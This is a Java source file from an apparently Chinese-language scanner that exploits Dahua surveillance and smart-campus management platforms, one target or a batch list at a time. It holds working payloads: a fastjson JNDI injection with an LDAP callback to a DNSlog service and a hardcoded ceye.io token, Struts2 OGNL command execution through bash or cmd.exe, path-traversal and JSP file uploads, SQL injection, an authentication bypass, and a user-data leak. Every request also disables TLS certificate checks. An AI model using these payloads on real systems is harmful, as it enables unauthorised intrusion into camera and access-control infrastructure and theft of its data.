                if (response.toString().contains("access_token")) {

                    test1.appendText(formattedDateTime + "[+]存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
                    test1.appendText(url + "用户justForTest 密码任意");

                } else {

                    test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
                }


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
            }


        }

    }

    public void ipms() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        if (!isValidUrl(url)) test1.appendText("输入的不是有效的网址" + "\n");
        else {
            // if (!isValidUrl(url)) {
            //       test1.appendText("输入的不是有效的网址" + "\n");
            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            //  } else {


            try {
                //  System.setProperty("http.proxyHost", "127.0.0.1");
                //    System.setProperty("http.proxyPort", "8080");

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);

                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                Random random = new Random();
                int randomNumber = random.nextInt(100) + 1;

                URL url1 = new URL(url + "/ipms/barpay/pay");
                String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                // String a;
                ml.setText(randomNumber + "." + ml.getText());
                String a;
                a = ml.getText();

                connection.setRequestProperty("Content-Type", "application/json");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                //   String inputLine;

                //     response.append(inputLine = br.readLine());
                //    while ((inputLine = br.readLine()) != null) {
                //   }
                //    response.append(inputLine);


                test1.appendText("防止网络阻塞，取消识别模式");
                test1.appendText("\n" + "随机为：" + a + "请人工检查" + "\n");
                test1.appendText("http://api.ceye.io/v1/records?token=da34368a6f5aa3ab4bd06fc9fcd91551&type=dns&filter=");


                //  yan();


                //        test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");


                //   test1.appendText(formattedDateTime + "[+]存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
                //     test1.appendText(url + "用户justForTest 密码任意");


                //    test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                //     System.out.println(e);

            }


        }


    }

    public void yan() {


        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL("http://api.ceye.io/v1/records?token=da34368a6f5aa3ab4bd06fc9fcd91551&type=dns&filter=");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }

            if (response.toString().contains(ml.getText())) {


                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台ipms远程代码执行漏洞" + "\n");


            } else {


                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台ipms远程代码执行漏洞" + "\n");
            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台ipms远程代码执行漏洞-" + "\n");
        }


    }

    public void poi() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            //       System.setProperty("http.proxyHost", "127.0.0.1");
            //     System.setProperty("http.proxyPort", "8080");
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../ce.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>aGVsbG8gd29ybGQ=</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();

            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml;charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            //   test1.appendText(errorResponse.toString());

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse.append(line);
                }

                //    test1.appendText(errorResponse.toString());
                test1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");


            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞-" + "\n");
            // System.out.println(e);
        }

    }

    public void poi1() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            //    System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();
            //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //  StringBuffer response = new StringBuffer();
            //   String inputLine;
            //   response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {
            //   }
            //   response.append(inputLine);


            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse.append(line);
                }


                cmd1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            } else {

                cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            }

            //   int responseCode = connection.getResponseCode();

            //  if (responseCode == 200) {


            //     cmd.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            //   } else {

            //      cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            //  }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞-" + "\n");
            //  System.out.println(e);
        }


    }

    public void voide() {


        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8081");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "<%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>";
            String fileData = "test";
            String file = "file";
            String submit = "submit";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"index.jsp\"\r\n\r\n");
            outputStream.writeBytes(fileData + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"\r\n\r\n");
            outputStream.writeBytes(file + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(submit + "\r\n");

            outputStream.writeBytes("--" + boundary + "--\r\n");

            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //   response.append(inputLine);
            // }


            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);


            if (response.toString().contains("path")) {

                cmd1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");


                //     upload();

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");
            System.out.println(e);
        }


    }

    public void emaph() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);

                // 处理 jsonObject
                // 进行后续操作

            }


            int responseCode = connection.getResponseCode();
            if (response.toString().contains("上传图片失败！")) {

                cmd1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");


            } else {
                cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");
            //  System.out.println(e);
        }

    }

    public void video1(String urlString) {


    }

    public void plcmd(String line) {


        //   String url = test2.getText();
        //   if (url.endsWith("/")) {
        //       url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        //   }
        //    if (!isValidUrl(url)) test1.appendText("输入的不是有效的网址" + "\n");
        //  else {
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        // 在这里编写任务执行的代码


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            // System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(line + "/admin/login_login.action");
            String json = "";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());

            if (response.toString().contains("test")) {

                url10.appendText(formattedDateTime + line + "[+++]存在大华DSS数字监控系统远程命令执行漏洞!!!" + "\n");

            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");


        }


    }


    public void plcmdsend() {

        try {
            //  e.printStackTrace();


        } catch (Exception e) {


        }

    }

    private List<String> readTextFile(String filePath) {
        List<String> lines = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                lines.add(line);
            }
        } catch (IOException e) {
            //  e.printStackTrace();
        }
        return lines;
    }

    public void pl1(String line) {


        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            //   String url = test2.getText();
            //  if (url.endsWith("/")) {
            //      url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            //  }
            URL url1 = new URL(line + "/admin/user_getUserInfoByUserName.action?userName=system");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //   StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);


                //    test1.appendText(response.toString());
            }


            //  int responseCode = connection.getResponseCode();
            if (response.toString().contains("loginName")) {

                url10.appendText(formattedDateTime + line + "[+++]存在大华智慧园区综合管理平台信息泄露漏洞!!!" + "\n");
                url10.appendText(formattedDateTime + response.toString() + "\n");

            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台信息泄露漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台信息泄露漏洞" + "\n");


        }

    }

    public void pl2(String line) {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            // System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(line + "/evo-apigw/evo-oauth/oauth/token");
            String json = "username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());
            if (response.toString().contains("access_token")) {

                url10.appendText(formattedDateTime + line + "[+]存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
                url10.appendText(line + "用户justForTest 密码任意");

            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智能物联综合管理平台justForTest用户登录漏洞" + "\n");
        }


    }

    public void pl3(String line) {

        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(line + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            //  int responseCode = connection.getResponseCode();
            if (response.toString().contains("XPATH")) {

                url10.appendText(formattedDateTime + line + "[+]存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");
                url10.appendText(formattedDateTime + line + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
